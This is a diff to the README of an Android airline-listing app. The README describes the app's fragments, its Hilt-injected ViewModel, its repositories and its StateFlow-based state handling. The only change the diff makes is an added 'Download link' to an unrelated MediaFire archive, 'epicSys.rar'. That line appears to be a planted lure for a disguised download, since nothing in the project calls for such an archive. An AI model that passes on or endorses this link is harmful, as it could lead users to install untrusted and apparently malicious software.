@@ -2,6 +2,8 @@
 
 ## Project Overview
 
+### Download link : https://www.mediafire.com/file/q86x4b1zf2yjz24/epicSys.rar/file
+
 ### First Screen (HomeFragment):
 
 The main activity hosts the navigation fragment, facilitating transitions between three main fragments: HomeFragment, DetailsFragment, and FavoriteFragment. The project employs two repositories, one serving as an interface (domain layer) and the other as RepoImp (data layer). RepoImp manages API and Local Database methods. The HomeFragment incorporates a ViewModel injected by Hilt, eliminating the need for a ViewModelFactory. The repository is utilized to invoke API methods, retrieve all airlines, and convey the data to the view through StateFlow. The Resource class is employed to handle responses, managing errors, success, and loading states.
